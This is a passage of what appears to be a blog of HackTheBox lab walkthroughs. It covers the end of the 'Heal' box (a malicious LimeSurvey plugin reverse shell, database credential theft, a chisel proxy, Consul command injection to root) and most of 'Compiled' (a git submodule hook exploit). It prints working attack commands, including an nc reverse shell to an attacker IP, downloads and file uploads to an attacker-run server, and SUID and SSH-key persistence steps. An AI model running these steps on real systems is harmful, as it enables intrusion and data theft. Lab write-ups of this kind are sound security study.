I checked for credential reuse on SSH, but unfortunately it didn&rsquo;t work. It does, however, let us into the LimeSurvey admin panel:
LimeSurvey Admin Panel Earlier when I first discovered that the target was running LimeSurvey, I did a little vulnerability research on the platform. I don&rsquo;t recall whether or not I knew the exact version that the target is running.
Regardless, I found a couple prime candidates that weren&rsquo;t really good options until now, since they both require an authenticated user to this dashboard:
CVE-2024-6933 SQLi at POST /index.php?r=admin/database/index/updatesurveylocalesettings_generalsettings CVE-2021-44967 RCE via uploading a malicious plugin to LimeSurvey Even though the RCE one is older, it&rsquo;s probably still viable. After all, to eliminate this kind of thing, the application developer would need to deny-list several important (albeit dangerous) PHP functions that commonly lead to RCE
This begs the question of whether or not that should have even been accepted as a CVE. After all, isn&rsquo;t the whole point of a plugin system that you&rsquo;re able to change the way something works?
Shouldn&rsquo;t that also include an intentional backdoor, if you wanted it? &#x1f914;
Therefore, since (2) has a good chance of leading to (1) as a side-effect, I&rsquo;ll attempt it first.
The NVD page on the CVE has a link to a github repo with a PoC exploit, presumably by the CVE author? They include some brief instructions on its use, too:
cd ./exploit git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git &amp;&amp; cd Limesurvey-RCE vim php-rev.php # edit the $ip and $port variables zip Y1LD1R1M.zip php-rev.php config.xml # zip these files to make a fake &#34;plugin&#34; package # Open a port for the reverse shell sudo ufw allow from $RADDR to any port 4444,8000 proto tcp bash nc -lvnp 4444 From the dashboard, we should be able to upload the plugin now. Click Configuration &gt; Plugins &gt; Upload &amp; Install:
LOL &#x1f643;
However, when we choose to Install, we are notified that this plugin is not compatible with the LimeSurvey installation. Since the &ldquo;plugin&rdquo; we provided is only two files (and one of them is just a reverse shell), the issue must be within config.xml:
Noting the target/s LimeSurvey version of 6.6.4, I added line 21 shown above into config.xml and re-zipped the exploit. This time, it accepted the upload just fine &#x1f44d;
Note that we still need to activate the malicious plugin:
Finally, according to the last line of the PoC exploit, we simply need to perform a request to http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php to open the reverse shell (I&rsquo;ll just browse to the URL):
The reverse shell opened &#x1f434;
Upgrade the shell First, let&rsquo;s change to bash:
SHELL=/bin/bash script -q /dev/null Now the usual stuff:
[ctrl+z] stty raw -echo; fg [enter] [enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 USER FLAG Local enumeration - www-data Checking netstat shows a surprising number of listeners on 127.0.0.1. I should probably bring chisel to the target and form a SOCKS proxy:
The only one I really recognize right away is 5432, which is a PostgreSQL database (and of course DNS).
A quick check to ps aux makes at least a couple of these listeners obvious:
We have the Puma server running via Ruby + Rails on http://api.heal.htb, reverse proxied to port 3001. React is running via Node + Express on http://heal.htb, but it&rsquo;s not clear what port it&rsquo;s on. We can get more of the story by using fold:
ps aux | grep node | fold -w 120 Node is running from /home/ralph, so we can&rsquo;t read it. consul is running too, but that&rsquo;s probably just to help with the box stability.
Sometimes it&rsquo;s convenient to peruse the target&rsquo;s files on my attacker host, so I&rsquo;ll start up an HTTP server that I can upload things to:
simple-server 8000 -v During enumeration, I might upload a few files using cURL - but I probably won&rsquo;t mention it in this walkthrough:
curl -F &#39;file=@./relative/path/to/file&#39; http://10.10.14.7:8000 Looking around for some interesting files within /var/www/limesurvey, I&rsquo;m immediately drawn to the admin directory. admin/admin.php points to admin/index.php which in turn references /../application/config/config.php:
// ... &#39;db&#39; =&gt; array( &#39;connectionString&#39; =&gt; &#39;pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;&#39;, &#39;emulatePrepare&#39; =&gt; true, &#39;username&#39; =&gt; &#39;db_user&#39;, &#39;password&#39; =&gt; &#39;AdmiDi0_pA$$w0rd&#39;, &#39;charset&#39; =&gt; &#39;utf8&#39;, &#39;tablePrefix&#39; =&gt; &#39;lime_&#39;, ) Exactly what I was hoping for! I&rsquo;ll start up a chisel server for a SOCKS5 proxy, then connect the chisel client, then finally we&rsquo;ll try connecting to the database.
Chisel SOCKS Proxy During user enumeration I found a locally-exposed port 5432 (probably PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
socks5 127.0.0.1 1080 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse Next, on the target machine, I&rsquo;ll download a precompiled version of chisel from my HTTP server, then start chisel in client mode and background the process:
cd /tmp/.Tools wget http://10.10.14.7:8000/chisel ./chisel client 10.10.14.7:9999 R:1080:socks &amp; Chisel server accepts the connection:
All good - now we can connect to all those ports we saw listening on 127.0.0.1.
PostgreSQL We already have the proxy running, and all the database connection info, so connecting to it should be easy:
Note that -h is for hostname in psql, not help &#x1f447;
Usual syntax: psql -h [host] [db_name] [username]
proxychains psql -h localhost survey db_user # password: AdmiDi0_pA$$w0rd Let&rsquo;s list the tables:
\\d There are 105 tables, but we see lime_users which might be interesting:
\\d lime_users select users_name,full_name,email,password from lime_users; Even though the hash is in a different format, this is the user we logged into the dashboard with, so we already know the password.
To verify, I re-cracked it using hashcat.
There&rsquo;s only one user, ralph. Too bad, I was really hoping for more! &#x1f44e;
Trying all the ports TCP 8500 It&rsquo;s clearly running HTTP. Let&rsquo;s try curl instead:
proxychains curl -i http://localhost:8500 # HTTP 301 to /ui/ proxychains curl -i http://localhost:8500/ui/ # Huge page, with some big chonker of an SVG in it This always takes foreeeveeerr to load, but I&rsquo;ll try running firefox through proxychains to the target host:
&#x26a0;&#xfe0f; Be sure to close all tabs in any existing Firefox instances before doing this
proxychains firefox --safe-mode http://127.0.0.1:8500 &amp; Yeah, it took a couple minutes, but it finally loaded:
It looks like Consul monitors itself (lol wut), the React app, PostgreSQL, and the Ruby API. We can also see the exact version is 1.19.2.
It looks like this version has a few vulnerabilities. One of them is even in Metasploit. I don&rsquo;t really enjoy using metasploit, so I found a good-looking alternative on Github: https://github.com/owalid/consul-rce
This script exploits a command injection vulnerability in Consul Api Services. The vulnerability exists in the ServiceID parameter of the PUT /v1/agent/service/register API endpoint. The ServiceID parameter is used to register a service with the Consul agent. The ServiceID parameter is not sanitized and allows for command injection. This vulnerability can be used to execute arbitrary commands on the host running the Consul agent.
The script may accept the CONSUL_TOKEN argument. I checked to see how I could obtain that token, and it&rsquo;s also through the same API:
curl -s http://localhost:8500/v1/agent/self | jq I didn&rsquo;t see the token, but I did see some slight indication that we might not need it:
We might not even need a token, eh? Alright, let&rsquo;s just try the exploit and see what happens!
cd ./exploit git clone https://github.com/owalid/consul-rce.git &amp;&amp; cd consul-rce proxychains python3 consul_rce.py -th localhost -tp 8500 -c &#39;touch /tmp/test&#39; Now we can check /tmp to see if it worked:
&#x1f62e; It worked! The /tmp/test file was written by root. Awesome!
If we can perform command injection as root, we can basically privesc any way we want. My usual go-to is planting an SSH key, but today let&rsquo;s do an SUID bash:
Initially, I tried doing both commands in one line, and it failed.
proxychains python3 consul_rce.py -th localhost -tp 8500 -c &#39;cp /usr/bin/bash /tmp/bak1209899923&#39; proxychains python3 consul_rce.py -th localhost -tp 8500 -c &#39;chmod u+s /tmp/bak1209899923&#39; Hopefully that resulted in an SUID copy of bash:
&#x1f389; Nice! Let&rsquo;s escalate to root:
./bak1209899923 -p &#x1f609; There&rsquo;s the flag; read it
cat /root/root.txt What a strange box - we got the root flag before the user flag! I don&rsquo;t like leaving an SUID copy of bash around (it spoils the box for other players), so I&rsquo;ll quickly plant an SSH key and login using a key instead:
ssh-keygen -t rsa -b 1024 -N &#39;parak33t&#39; -f root_id_rsa cat root_id_rsa.pub | base64 -w 0 # [COPY] to clipboard Using our root shell, plant the key:
echo -n &#39;[PASTE]&#39; | base64 -d &gt;&gt; /root/.ssh/authorized_keys Now I should be able to log in over SSH from my attacker host:
ssh -i ./root_id_rsa root@heal.htb ROOT FLAG &#x261d;&#xfe0f; I know that we&rsquo;re actually going for the user flag and the header above says &ldquo;root flag&rdquo;, I just didn&rsquo;t want to spoil the surprise by writing &ldquo;root flag&rdquo; as happening before &ldquo;user flag&rdquo; &#x1f609;
Of course, we can now check both users&rsquo; home directories and see that it&rsquo;s actually ron that holds the user flag. Go ahead and read it to finish off the box:
cat /home/ron/user.txt CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf ./exploit/* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x26a1; Use ZAP right away. It might even be good to spider the target before doing any other web enumeration. There&rsquo;s a really good chance that you will get some quick wins that would otherwise have required a few minutes of scanning. This can also help uncover things that the typical web fuzzing would miss, or you wouldn&rsquo;t think to check (HTML comments, non-GET URIs, etc.)
&#x1f48e; Research a framework if you have never developed an app with it. It took me a little while before I realized precisely which files were important for the configuration of a Ruby + Rails + Puma app. However, once I did, I added those files to a checklist so I won&rsquo;t forget again!
Defender &#x1f47b; Use service accounts. I&rsquo;m still a little puzzled about why we were able to use Consul for privesc to root. The exploit was quite old, which suggests to me that Consul is&hellip; not great. But on top of that, why was Consul running as root? Why not make a service account that can only manage Consul and the three services it was monitoring?
&#x1f418; ​Disable dangerous functions in PHP web apps. We were able to open a reverse shell by using a very basic PHP reverse shell. The dangerous functions used by that reverse shell are very well-known, so why were they not disabled by default?
`,url:"https://4wayhandshake.github.io/walkthrough/heal/"},"https://4wayhandshake.github.io/walkthrough/compiled/":{title:"Compiled",tags:["Gitea","Git","Password Cracking","SQLite","MSFVenom","Visual Studio","RunasCs","Mimikatz"],categories:["Walkthrough","HTB","Windows","Medium"],content:`INTRODUCTION I&rsquo;d like to say I had a fun time with Compiled, but I really didn&rsquo;t. It had several good learning moments, but also a lot of really painful and time-consuming steps. It was very much a &ldquo;CVE box&rdquo;.
Recon was easy. The initial nmap scans tell us almost everything we need to know. Two HTTP services are found right away, and the default script scan shows the presence of a subdomain. Avoid the pitfall here of investigating one of the services too deeply without checking out the other one, too. The services are highly related to each other; it will make a lot more sense after seeing both. Remember to write down versions of everything when you see them, and don&rsquo;t skip the vuln research!
Achieving a foothold requires one program - one that I guarantee is already on your box. The exploit itself seems a little absurd, but keep following in the footsteps of the vulnerability researchers before you and you will eventually get the exploit. It will require a little bit of customization for the target, so it&rsquo;s essential to take the time to really understand the exploit and figure out how you can replicate it on this box.
Getting the user flag was deeply unpleasant, but it taught me quite a bit about some cryptography stuff. Thankfully, I was able to write my own solution for it, culminating in a useful git repo.
Privilege escalation to Administrator was&hellip; also deeply unpleasant. The local enumeration for privesc full of guesswork, with scant clues to point you in the right direction. Thankfully, some manual enumeration was enough to make me pay attention to the right things. This is one of those boxes where you only find out that you need Windows to solve it after you are far into the box. I was extremely lucky to have someone available that could assist me with the &ldquo;Windows-required&rdquo; steps and help craft an exploit.
Personally, I would not recommend this box.
I originally did this box in August 2024, getting all the way up to identifying the privesc exploit. Unfortunately, my hacking environment was a little too limited to finish it off at that time. Thankfully, somebody helped me compile the exploit, so I was able to finish it off today, after all this time! &#x1f4c6;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 3000/tcp open ppp 5000/tcp open upnp 5985/tcp open wsman 7680/tcp open pando-pub Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=d3114104b84c841f; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=1J2ETRj2gxnJONJnqMPQJdw2GqU6MTcyNDMxNDE1NDI5NjMxNTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Thu, 22 Aug 2024 08:09:14 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-arc-green&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Git&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA&#34;&gt; | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=131440bde92fefd6; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=6dtQ8_jPmeBXprtHpJ5H_JKNqs46MTcyNDMxNDE1OTcwOTQ3NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Thu, 22 Aug 2024 08:09:19 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/3.0.3 Python/3.12.3 | Date: Thu, 22 Aug 2024 08:09:14 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5234 | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Compiled - Code Compiling Services&lt;/title&gt; | &lt;!-- Bootstrap CSS --&gt; | &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt; | &lt;!-- Custom CSS --&gt; | &lt;style&gt; | your custom CSS here */ | body { | font-family: &#39;Ubuntu Mono&#39;, monospace; | background-color: #272822; | color: #ddd; | .jumbotron { | background-color: #1e1e1e; | color: #fff; | padding: 100px 20px; | margin-bottom: 0; | .services { | RTSPRequest: | &lt;!DOCTYPE HTML&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;title&gt;Error response&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;h1&gt;Error response&lt;/h1&gt; | &lt;p&gt;Error code: 400&lt;/p&gt; | &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt; | &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt; | &lt;/body&gt; |_ &lt;/html&gt; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp filtered pando-pub Port 3000 is probably just a regular webserver. Port 5000 has the title Compiled - Code Compiling Services - I wonder if it will be like Builder, where we broke out of a Jenkins CI/CD pipeline to achieve RCE &#x1f914; Port 5985 is for remote connection using WinRM Port 7680 is a bit of a mystery. Odd that it&rsquo;s filtered though. Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results.
Webserver Strategy Banner grabbing First I&rsquo;ll check port 3000:
whatweb --aggression 3 http://$RADDR:3000 &amp;&amp; curl -IL http://$RADDR:3000 Oh, nice! It&rsquo;s Gitea, the self-hosted git repo server. I&rsquo;ll be sure to check that if I need any source code.
Next I&rsquo;ll check port 5000:
Looks like a typical webserver. Maybe Werkzeug + Flask?
I didn&rsquo;t see any redirect, but I&rsquo;ll add entries to /etc/hosts anyway:
DOMAIN=compiled.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR gitea.$DOMAIN&#34; | sudo tee -a /etc/hosts Explore the Website I&rsquo;ll take a quick look at the HTTP server on port 5000, just to see what we&rsquo;re dealing with. The only interesting thing I see is this form to submit a URL and have the server compile your code for you:
Using ZAP Spider I crawled the website and found that it is just as simple as it looks:
Glance at the repo We just identified that the service on port 3000 is gitea. Let&rsquo;s check if any of the repos are publicly visible:
Yep! the repo richard / Compiled is probably the repo of the website that&rsquo;s running on port 5000. Let&rsquo;s check inside:
This definitely looks like the server on port 5000. The README.md gives some simple instructions on how to use the site:
Usage Once the application is up and running, follow these steps to compile your projects:
Open your web browser and navigate to http://localhost:5000. Enter the URL of your GitHub repository (must be a valid URL starting with http:// and ending with .git). Click the Submit button. Wait for the compilation process to complete and view the results. Let&rsquo;s take a look at app.py to verify their claims:
from flask import Flask, request, render_template, redirect, url_for import os app = Flask(__name__) # Configuration REPO_FILE_PATH = r&#39;C:\\Users\\Richard\\source\\repos\\repos.txt&#39; @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def index(): error = None success = None if request.method == &#39;POST&#39;: repo_url = request.form[&#39;repo_url&#39;] if # Add a sanitization to check for valid Git repository URLs. with open(REPO_FILE_PATH, &#39;a&#39;) as f: f.write(repo_url + &#39;\\n&#39;) success = &#39;Your git repository is being cloned for compilation.&#39; else: error = &#39;Invalid Git repository URL. It must start with &#34;http://&#34; and end with &#34;.git&#34;.&#39; return render_template(&#39;index.html&#39;, error=error, success=success) if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;, port=5000) &#x1f602; I&rsquo;m glad I checked - Take a look at the if clause in the POST handler: there&rsquo;s no condition! We should be able to use any URL on the form and it will be written into C:\\Users\\Richard\\source\\repos\\repos.txt.
&#x261d;&#xfe0f; There&rsquo;s a pretty good chance we can have some fun with this flaw. An SSRF is likely, at least &#x1f6a9;
Host enumeration Next I&rsquo;ll perform vhost and subdomain enumeration:
I don&rsquo;t see any need to check the gitea port for alternate vhosts.
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR:5000/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v As expected, there were no results. Now I&rsquo;ll check for subdomains of compiled.htb
ffuf -w $WLIST -u http://$RADDR:5000 -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://compiled.htb:5000. I&rsquo;m just going to check if there are any other directories, in case the site we&rsquo;re visiting is (for some reason) different than the one in the richard/Compiled git repo:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/FUZZ -t 60 -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v No results. I&rsquo;m content to assume that the website is the same as the one we saw on gitea.
FOOTHOLD Let&rsquo;s try playing around with this Compiled form a little.
Normal behaviour It was very generous of the box creator to provide the richard/Calculator repo as well. This way, we don&rsquo;t actually need Visual Studio to try out the website. The repo is at http://gitea.compiled.htb:3000/richard/Calculator.git.
I clicked submit, and got the correct message:
But Step 4 of the instructions seems to be&hellip; not happening &#x1f605;
Wait for the compilation process to complete and view the results. Maybe it doesn&rsquo;t ever finish?
Abnormal behaviour Let&rsquo;s try a variety of URLs in this form:
http://127.0.0.1:3000/nobody/nothing.git &#x2705; &ldquo;Your git repository is being cloned for compilation&rdquo;
This means that no checks are being performed on whether or not the destination exists, or is a valid git repo.
http://127.0.0.1:3000/foo/bar.baz &#x274c; &ldquo;Invalid Git repository URL. It must start with &ldquo;http://&rdquo; and end with &ldquo;.git&rdquo;.&rdquo;
This means that (1) the website we are looking at is actually different than richard/Compiled shown on gitea and that (2) the form is probably running the URL through a regex to see if the URL conditions are met
http://127.0.0.1:3000/foo/bar.git (with a space on the front) &#x274c; &ldquo;Invalid Git repository URL. It must start with &ldquo;http://&rdquo; and end with &ldquo;.git&rdquo;.&rdquo;
Vulnerable versions of urllib could be fooled by adding a space before the protocol. This isn&rsquo;t vulnerable.
http://127.0.0.1:3000/foo/bar.git\\nhttp://http://127.0.0.1:3000/foo/bar.baz (with a newline after a valid entry but before invalid entry) &#x274c; &ldquo;Invalid Git repository URL. It must start with &ldquo;http://&rdquo; and end with &ldquo;.git&rdquo;.&rdquo;
Poorly implemented usage of certain languages&rsquo; regex filters could be tricked with a newline character
I wonder if it&rsquo;s contacting the provided URL at all. To find out, I&rsquo;ll start up my own HTTP server and check for incoming connections:
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www simple-server 8000 -v I&rsquo;ll enter http://10.10.14.5:8000/nobody/nothing.git into the form and see what happens.
After a short while, this request came in:
&#x1f914; That proves that something is actually processing the URLs that get stored into (presumably) the repos.txt file. Some kind of bot or scheduled task must be doing it. It also proves that the target is using git 2.45.0.
To verify, I tried using git clone against my own webserver, and I got an identical request. This suggests that the target is probably just running git clone &lt;url&gt; against every url that is provided to it.
Makefile hooks &#x1f6ab; This method didn&rsquo;t lead anywhere. Proceed to the next section if you&rsquo;re short on time. In this section, I explore whether it&rsquo;s possible to put commands inside the makefile of a program and execute them by requesting compilation.
Let&rsquo;s assume that the target is actually attempting to compile the git repos that are provided to it. That would mean that the target would need to git clone the repo, then parse at least one of these:
The project&rsquo;s makefile .csproj file .vcxproj file In my experience, makefile is a very versatile thing - you can get it to do basically any command automatically. Perhaps we can use this to gain RCE?
I had a little conversation with ChatGPT to ask about doing this:
On Windows, is it possible to run a command during a build process by adding a line to a .vcxproj, .csproj, or a makefile? I want to run a CMD command upon building.
The short answer is yes, it is possible. Here&rsquo;s what we can do for a .vcxproj file (we already have a sample of one from the richard/Calculator repo):
&lt;Project DefaultTargets=&#34;Build&#34; xmlns=&#34;http://schemas.microsoft.com/developer/msbuild/2003&#34;&gt; &lt;!-- Other project configurations --&gt; &lt;ItemGroup&gt; &lt;!-- ... --&gt; &lt;/ItemGroup&gt; &lt;PropertyGroup&gt; &lt;!-- ... --&gt; &lt;/PropertyGroup&gt; &lt;!-- Add this section for the custom command --&gt; &lt;Target Name=&#34;CustomBuildStep&#34; BeforeTargets=&#34;ClCompile&#34;&gt; &lt;Exec Command=&#34;echo Custom command running...&#34; /&gt; &lt;/Target&gt; &lt;/Project&gt; To try this out, let&rsquo;s first register a user on gitea so that we can upload our test code as our own repo. I registered jimbob : Password123:
Now we&rsquo;ll create a new repo (click the Plus button at the top of the gitea interface):
Clone the empty repo:
cd exploit git clone http://gitea.compiled.htb:3000/jimbob/MyCalculator.git # Use credentials jimbob : Password123 Now clone richard/Calculator so we can copy its files:
git clone http://gitea.compiled.htb:3000/richard/Calculator.git cd Calculator Copy over everything except the git related stuff, basically the non-hidden files:
cp -r Calculator Calculator.sln README.md ../MyCalculator vim ../MyCalculator/Calculator/Calculator.vcxproj Edit the .vcxproj file to contain a test command:
Since we&rsquo;re not actually sure that the target has wget, maybe it would have been better to use git clone as our test command, since it does a web request too &#x1f937;&zwj;&#x2642;&#xfe0f;
Now we can make a commit to our test repo:
cd ../MyCalculator git add . git commit -m &#34;Initial commit&#34; git push With that complete, we now have a URL for our test repo: http://gitea.compiled.htb:3000/jimbob/MyCalculator.git. Start up a test HTTP server and let&rsquo;s enter this URL into http://compiled.htb:5000
&#x1f447; I&rsquo;m using my own tool, simple-server, because it&rsquo;s handy for catching base-64 encoded data. It&rsquo;s also good for exfiltrating files. Feel free to try it yourself.
# open firewall port if you havent already sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v I waited&hellip; then waited some more&hellip; nothing happened! To be fair, I&rsquo;m not actually sure that the target is actually compiling anything. All we&rsquo;ve proven is that a git clone operation is taking place, but we haven&rsquo;t actually seen evidence of compilation happening.
Vulnerability research Earlier, we observed the git clone operation happening by asking the target to compile a bogus repo from our attacker-controlled http server, then logging the request headers. This showed that the attacker is indeed running git clone, but also that they are using git 2.45.0.
A quick search on &ldquo;git 2.45.0 vulnerability exploit poc&rdquo; shows that there is indeed a vulnerability in this version of git! It&rsquo;s a code regression, labelled as CVE-2024-32002. A security researcher made a fantastic post about discovering this bug, demonstrating a PoC for it as well.
It works by abusing an oversight in capitalization, and only works on case-insensitive filesystems. Essentially, we define a hook script in one repo, then set that repo as a submodule of another repo. That way, when the main repo is cloned recursively, the hook will execute. If we can put a reverse shell into the hook, we should be able to gain RCE.
CVE-2024-32002 I first tried initializing repos for this exploit by running git init locally then pushing to the gitea server (as with my jimbob user), but it turns out that the server refuses &ldquo;push to create&rdquo; of repos:
Therefore I&rsquo;ll need to create the repos using gitea.compiled.htb, clone them, copy in the code, then push the changes.
Let&rsquo;s first create the repos. I&rsquo;ll use MyCalculator as the &ldquo;primary&rdquo; repo (the one with a submodule) and I&rsquo;ll use MyHook as the &ldquo;child&rdquo; repo (the one with the post-checkout hook we&rsquo;re trying to execute):
cd exploit git clone http://gitea.compiled.htb:3000/jimbob/MyHook.git git clone http://gitea.compiled.htb:3000/jimbob/MyCalculator.git Let&rsquo;s make the hook repo first. Following along with the PoC, I&rsquo;ll make a post-checkout hook in a directory called y:
sudo ufw allow from $RADDR to any port 4444,8000 proto tcp mkdir -p MyHook/y/hooks vim MyHook/y/hooks/post-checkout # see below I&rsquo;m not quite sure what I&rsquo;ll use in the hook yet, so I&rsquo;ve just put some web requests in it that will indicate if anything worked:
#!/bin/bash wget http://10.10.14.10:8000/prog=wget curl http://10.10.14.10:8000/prog=curl git clone http://10.10.14.10:8000/nobody/gitclone.git nc.exe 10.10.14.10 4444 -e cmd Thats&rsquo;s all for MyHook. I&rsquo;ll push to gitea:
cd MyHook git add . git commit -m &#34;Added hook&#34; git push origin main Copy the path to that repo, because now we&rsquo;ll need to add it as a submodule into MyCalculator:
cd ../MyCalculator # Copy over richard/Calculator code cp -r ../Calculator/* ./ git submodule add --name x/y &#34;http://gitea.compiled.htb:3000/jimbob/MyHook.git&#34; A/modules/x git commit -m &#34;Add submodule&#34; The next steps are taken directly from the PoC. I found that this repo did a much better job explaining what was happening, so I&rsquo;ve taken their comments verbatim. In short, we&rsquo;re adding a symlink to the .git file:
# Create a symlink to the .git directory # Print the string &#34;.git&#34; to a file named dotgit.txt printf .git &gt; dotgit.txt # Generate a hash for the contents of dotgit.txt and store it in dot-git.hash # The \`-w\` option writes the object to the object database, and the hash is output git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash # Create an index info line for a symbolic link with the mode 120000 # The line is formatted as: &#34;120000 &lt;hash&gt; 0\\ta&#34; # 120000 indicates a symbolic link, &lt;hash&gt; is the content hash, and &#39;a&#39; is the path in the index printf &#34;120000 %s 0\\ta\\n&#34; &#34;$(cat dot-git.hash)&#34; &gt; index.info # Update the git index with the information from index.info # This effectively stages the symbolic link for the next commit git update-index --index-info &lt; index.info Commit the changes and push:
git commit -m &#34;Add symlink&#34; git push origin main Start up the listeners, in case this actually works:
cd www simple-server 8000 -v &amp; rlwrap nc -lvnp 4444 All that&rsquo;s left to do is to request that http://compiled.htb:5000 compiles our code:
Moments later, my http server received evidence that we executed the post-checkout hook!
The curl command and git clone commands both ran. I didn&rsquo;t see any evidence of wget or nc running.
I&rsquo;ll adjust the payload and see if there&rsquo;s anything that will get me a shell.
Note: To update the payload in post-checkout, the updates need to be committed.
cd MyHook # Make the edits vim y/hooks/post-checkout git add y/hooks/post-checkout git commit -m &#34;updated post-checkout hook&#34; git push origin main cd ../MyCalculator git submodule update --remote A/modules/x git add A/modules/x git commit -m &#34;updated submodule&#34; git push origin main Currently, I don&rsquo;t know much about the target system - pretty much just that it&rsquo;s Windows, probably running gitbash (this explains why the #!/bin/bash shebang was not a problem). We clearly have code execution, and the post-checkout hook is being executed line by line&hellip; so let&rsquo;s just shove a ton of payloads into one script and see what works!
First, I&rsquo;ll generate a couple &ldquo;staged&rdquo; payloads:
&#x1f447; Aside from the exe reverse shell, these are all from https://www.revshells.com/
